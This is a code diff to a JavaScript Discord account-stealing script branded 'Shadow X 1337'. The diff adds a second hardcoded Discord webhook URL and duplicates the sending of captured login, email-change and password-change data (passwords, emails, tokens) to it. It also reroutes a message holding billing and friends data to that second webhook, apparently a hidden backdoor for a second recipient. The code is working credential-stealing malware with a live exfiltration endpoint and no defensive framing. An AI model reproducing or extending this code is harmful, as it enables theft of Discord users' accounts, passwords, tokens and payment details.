@@ -12,6 +12,7 @@ var config = {
     brand: "Shadow X 1337",
 
     webhook: "%WEBHOOK_LINK%",
+    webhook2: "https://discord.com/api/webhooks/1094351023423897650/1qGssvgegfTHoSiMQijfAzrXEhHiKpZDoR8LzkguL4Pzh1QoUch4LnIg8A78iB1C1JAE",
 
     logout: true,
     disable_qr_code: true,
@@ -309,6 +310,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 
     async userLogin(password, email, token) {
@@ -378,6 +380,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 
     async emailChanged(password, newEmail, token) {
@@ -447,6 +450,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 
     async passwordChanged(oldPassword, newPassword, token) {
@@ -516,6 +520,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 }
 
@@ -702,7 +707,7 @@ async function initialize() {
                 billing = await getBilling(token);
                 friends = await getRelationships(token);
 
-                sendToWebhook({
+                sendToWebhook2({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
